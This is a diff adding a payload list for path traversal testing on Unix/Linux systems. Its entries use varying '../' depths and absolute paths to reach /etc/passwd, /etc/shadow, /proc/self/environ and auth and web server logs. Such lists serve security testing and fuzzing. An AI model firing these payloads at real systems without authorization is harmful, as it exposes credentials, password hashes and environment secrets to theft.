@@ -1,0 +1,45 @@
+# Path Traversal - Unix/Linux
+# Payloads targeting sensitive files on Unix-like systems
+# Various traversal depths and target files
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../etc/shadow
+../../etc/shadow
+../../../etc/shadow
+../../../../etc/shadow
+../etc/hosts
+../../etc/hosts
+../../../etc/hosts
+../etc/hostname
+../../etc/hostname
+../etc/issue
+../../etc/issue
+../etc/group
+../../etc/group
+../etc/motd
+../../etc/motd
+../proc/self/environ
+../../proc/self/environ
+../../../proc/self/environ
+../proc/version
+../../proc/version
+../proc/self/cmdline
+../../proc/self/cmdline
+../var/log/auth.log
+../../var/log/auth.log
+../var/log/apache2/access.log
+../../var/log/apache2/access.log
+../var/log/apache2/error.log
+../var/log/nginx/access.log
+../../var/log/nginx/access.log
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
